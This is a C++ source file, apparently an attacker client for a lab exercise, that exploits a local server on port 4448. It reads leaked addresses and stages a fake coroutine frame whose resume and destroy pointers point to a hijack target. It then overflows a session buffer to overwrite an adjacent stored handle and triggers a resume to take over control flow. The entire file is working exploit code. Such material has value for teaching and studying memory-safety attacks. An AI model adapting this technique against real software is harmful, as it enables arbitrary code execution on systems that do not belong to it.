/*
 * fakeframe_attacker.cpp — client for fake-frame injection (TCP :4448)
 * ====================================================================
 * Stages a fake frame in the scratch buffer (resume/destroy both ->
 * hijack_target, TypeID slot left 0), then overflows Session.buf to overwrite
 * the adjacent stored handle so it points at the fake frame. TRIGGER resumes it.
 */
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <string>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

static int sfd;
static void sendline(const std::string &s) { std::string l = s + "\n"; write(sfd, l.data(), l.size()); }
static std::string recvline() { std::string r; char c; while (read(sfd, &c, 1) == 1 && c != '\n') r += c; return r; }
static std::string le64(uint64_t v) { std::string h; for (int i = 0; i < 8; i++) { char b[3]; snprintf(b, 3, "%02x", (unsigned)((v >> (8 * i)) & 0xff)); h += b; } return h; }

int main(int argc, char **argv) {
    uint16_t port = (argc > 1) ? (uint16_t)atoi(argv[1]) : 4448;
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in sa = {}; sa.sin_family = AF_INET; sa.sin_port = htons(port);
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);
    if (connect(sfd, (sockaddr *)&sa, sizeof sa) < 0) { perror("connect"); return 1; }

    printf("[ATTACKER] %s\n", recvline().c_str());        // READY

    sendline("INFO");
    uintptr_t buf = 0, handle_store = 0, scratch = 0, hj = 0;
    recvline();                                           // "OK"
    for (std::string l; (l = recvline()) != "END" && !l.empty(); ) {
        char k[64]; unsigned long long v;
        if (sscanf(l.c_str(), "%63s %llx", k, &v) == 2) {
            if      (!strcmp(k, "buf"))           buf          = (uintptr_t)v;
            else if (!strcmp(k, "handle_store"))  handle_store = (uintptr_t)v;
            else if (!strcmp(k, "scratch"))       scratch      = (uintptr_t)v;
            else if (!strcmp(k, "hijack_target")) hj           = (uintptr_t)v;
        }
    }
    long delta = (long)(handle_store - buf);
    printf("[ATTACKER] buf=%#lx handle_store=%#lx scratch=%#lx hijack=%#lx (buf->handle=%ld)\n",
           buf, handle_store, scratch, hj, delta);

    // 1) stage a fake frame in scratch: resume & destroy both -> hijack_target.
    sendline("STAGE " + le64(hj) + le64(hj));
    printf("[ATTACKER] STAGE -> %s\n", recvline().c_str());

    // 2) overflow Session.buf to overwrite the stored handle with &scratch.
    std::string hex;
    for (long i = 0; i < delta; i++) hex += "41";
    hex += le64(scratch);
    sendline("SEND " + hex);
    printf("[ATTACKER] overflow (%ld filler + handle ptr) -> %s\n", delta, recvline().c_str());

    // 3) resume the now-redirected handle.
    sendline("TRIGGER");
    printf("[ATTACKER] TRIGGER -> %s\n", recvline().c_str());
    sendline("QUIT");
    return 0;
}
